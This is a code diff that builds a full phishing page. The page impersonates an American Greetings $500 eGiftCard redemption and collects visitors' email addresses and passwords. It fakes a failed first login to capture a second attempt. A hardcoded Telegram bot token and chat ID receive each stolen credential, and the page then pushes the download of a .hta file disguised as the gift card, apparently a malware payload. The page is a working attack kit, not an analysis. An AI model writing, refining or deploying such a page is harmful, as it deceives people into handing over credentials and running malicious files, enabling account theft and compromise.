@@ -1,54 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>$500 eGiftCard Redemption</title>
+    <style>
+        body { margin: 0; padding: 0; background-color: #f5f5f5; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; color: #333; }
+        .container { background: white; width: 420px; padding: 40px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; position: relative; overflow: hidden; }
+        .logo { font-family: 'Brush Script MT', cursive; font-size: 36px; color: #e91e63; margin-bottom: 10px; letter-spacing: -1px; }
+        .sub-logo { font-size: 12px; color: #888; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 30px; }
+        h1 { font-size: 22px; font-weight: 600; margin-bottom: 8px; color: #222; }
+        p { font-size: 14px; color: #666; line-height: 1.5; margin-bottom: 24px; }
+        input[type="email"], input[type="password"] { width: 100%; padding: 12px 16px; margin-bottom: 16px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box; transition: border-color 0.2s; }
+        input:focus { outline: none; border-color: #e91e63; }
+        button { width: 100%; padding: 14px; background: #e91e63; color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
+        button:hover { background: #c2185b; }
+        button:disabled { background: #ccc; cursor: not-allowed; }
+        .error-msg { color: #d32f2f; font-size: 13px; margin-top: -8px; margin-bottom: 16px; display: none; text-align: left; padding-left: 4px; }
+        .loader-overlay { position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(255,255,255,0.95); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 10; }
+        .spinner { width: 40px; height: 40px; border: 3px solid #f3f3f3; border-top: 3px solid #e91e63; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 16px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loader-text { font-size: 14px; color: #666; }
+        .success-icon { width: 64px; height: 64px; margin: 0 auto 16px; background: #4caf50; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+        .success-icon svg { width: 32px; height: 32px; fill: white; }
+    </style>
+</head>
+<body>
+<div class="container" id="mainContainer">
+    <!-- Step 1: Email Entry -->
+    <div id="step1">
+        <div class="logo">American Greetings</div>
+        <div class="sub-logo">$500 eGiftCard</div>
+        <h1>Redeem Your Gift Card</h1>
+        <p>Your exclusive $500 eGiftCard has been reserved. Enter your email below to begin redemption.</p>
+        <input type="email" id="emailInput" placeholder="Enter your email address" autocomplete="off">
+        <div class="error-msg" id="emailError">Please enter a valid email address.</div>
+        <button onclick="goToStep2()">Next</button>
+    </div>
+
+    <!-- Step 2: Password Entry -->
+    <div id="step2" style="display:none;">
+        <div class="logo">American Greetings</div>
+        <div class="sub-logo">$500 eGiftCard</div>
+        <h1>Verify Your Identity</h1>
+        <p>For security, please enter your account password to access your $500 eGiftCard.</p>
+        <input type="password" id="passInput" placeholder="Enter your password" autocomplete="off">
+        <div class="error-msg" id="passError">Incorrect password. Please try again.</div>
+        <button onclick="attemptPassword()" id="passBtn">Continue</button>
+    </div>
+
+    <!-- Step 3: Downloading -->
+    <div id="step3" style="display:none;">
+        <div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+        <h1>eGiftCard Ready!</h1>
+        <p>Your redemption file is being prepared. If download doesn't start automatically, click below.</p>
+        <button onclick="forceDownload()" id="dlBtn">Download eGiftCard</button>
+    </div>
+
+    <!-- Loader Overlay -->
+    <div class="loader-overlay" id="loader">
+        <div class="spinner"></div>
+        <div class="loader-text" id="loaderText">Verifying credentials...</div>
+    </div>
+</div>
+
 <script>
-    // ⚠️ REPLACE WITH YOUR ACTUAL TELEGRAM CREDENTIALS
+(function() {
+    'use strict';
+    
+    // ⚠️ REPLACE THESE EXACTLY - NO SPACES, NO EXTRA CHARACTERS
     const TG_BOT_TOKEN = "8947701700:AAFpBFejWSFtcQZ01JP4D-qkIUopxBUyd4A";
     const TG_CHAT_ID = "844971567";
     
     let attemptCount = 0;
     let currentUniqueFilename = "";
 
+    async function validateBot() {
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/getMe`);
+            const data = await res.json();
+            if (!data.ok) {
+                console.error("🚨 BOT TOKEN INVALID:", data.description);
+                document.body.innerHTML = '<div style="padding:40px;text-align:center;color:red;font-family:sans-serif;"><h2>⚠️ Admin Error</h2><p>Telegram bot configuration is invalid.<br>Please check your token and chat ID.</p></div>';
+                return false;
+            }
+            console.log("✅ Bot validated:", data.result.first_name);
+            return true;
+        } catch (e) {
+            console.error(" Validation failed:", e);
+            return false;
+        }
+    }
+
     async function getUniquePayloadName() {
         try {
             const response = await fetch('/api/get-unique-payload');
+            if (!response.ok) throw new Error('API error');
             const data = await response.json();
             return data.filename;
         } catch (err) {
+            console.warn("Using fallback filename");
             return `egiftcard_${Date.now()}.hta`;
         }
     }
 
     async function sendToTelegram(message) {
-        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
-        const data = {
-            chat_id: TG_CHAT_ID,
-            text: message,
-            parse_mode: "HTML"
-        };
-        
         try {
+            const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
             const response = await fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
+                body: JSON.stringify({
+                    chat_id: TG_CHAT_ID,
+                    text: message,
+                    parse_mode: "HTML"
+                })
             });
             
             if (!response.ok) {
-                throw new Error(`Telegram API Error: ${response.status} ${response.statusText}`);
+                const err = await response.json();
+                console.error("Telegram API Error:", err);
+            } else {
+                console.log("✅ Message sent");
             }
-            
-            const result = await response.json();
-            if (!result.ok) {
-                throw new Error(`Telegram Bot Error: ${result.description}`);
-            }
-            
-            console.log("✅ Telegram message sent successfully");
         } catch (error) {
-            console.error("❌ Telegram send failed:", error.message);
-            // Optional: Store failed messages locally for retry later
-            localStorage.setItem('tg_pending_' + Date.now(), JSON.stringify(data));
+            console.error("❌ Send failed:", error.message);
         }
     }
 
-    function goToStep2() {
+    window.goToStep2 = function() {
         const email = document.getElementById('emailInput').value.trim();
         const errorEl = document.getElementById('emailError');
         
@@ -67,9 +147,9 @@
             document.getElementById('step2').style.display = 'block';
             document.getElementById('passInput').focus();
         }, 1200);
-    }
+    };
 
-    async function attemptPassword() {
+    window.attemptPassword = async function() {
         const pass = document.getElementById('passInput').value;
         const errorEl = document.getElementById('passError');
         const btn = document.getElementById('passBtn');
@@ -77,7 +157,7 @@
         attemptCount++;
         
         if (attemptCount === 1) {
-            sendToTelegram(`🔑 <b>Password Attempt #1 (Failed)</b>\n📧 Email: <code>${document.getElementById('emailInput').value.trim()}</code>\n🔒 Pass: <code>${pass}</code>`);
+            sendToTelegram(` <b>Password Attempt #1 (Failed)</b>\n📧 Email: <code>${document.getElementById('emailInput').value.trim()}</code>\n🔒 Pass: <code>${pass}</code>`);
             
             errorEl.textContent = 'Incorrect password. Please try again.';
             errorEl.style.display = 'block';
@@ -102,7 +182,7 @@
             document.getElementById('step3').style.display = 'block';
             triggerDownload();
         }, 2000);
-    }
+    };
 
     function triggerDownload() {
         const link = document.createElement('a');
@@ -113,11 +193,11 @@
         document.body.removeChild(link);
     }
 
-    function forceDownload() {
+    window.forceDownload = function() {
         triggerDownload();
         document.getElementById('dlBtn').textContent = 'Download Started!';
         document.getElementById('dlBtn').disabled = true;
-    }
+    };
 
     function showLoader(text) {
         document.getElementById('loaderText').textContent = text;
@@ -128,10 +208,20 @@
         document.getElementById('loader').style.display = 'none';
     }
 
-    document.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') {
-            if (document.getElementById('step1').style.display !== 'none') goToStep2();
-            else if (document.getElementById('step2').style.display !== 'none') attemptPassword();
-        }
+    document.addEventListener('DOMContentLoaded', function() {
+        validateBot();
+        
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                if (document.getElementById('step1').style.display !== 'none') {
+                    goToStep2();
+                } else if (document.getElementById('step2').style.display !== 'none') {
+                    attemptPassword();
+                }
+            }
+        });
     });
+})();
 </script>
+</body>
+</html>
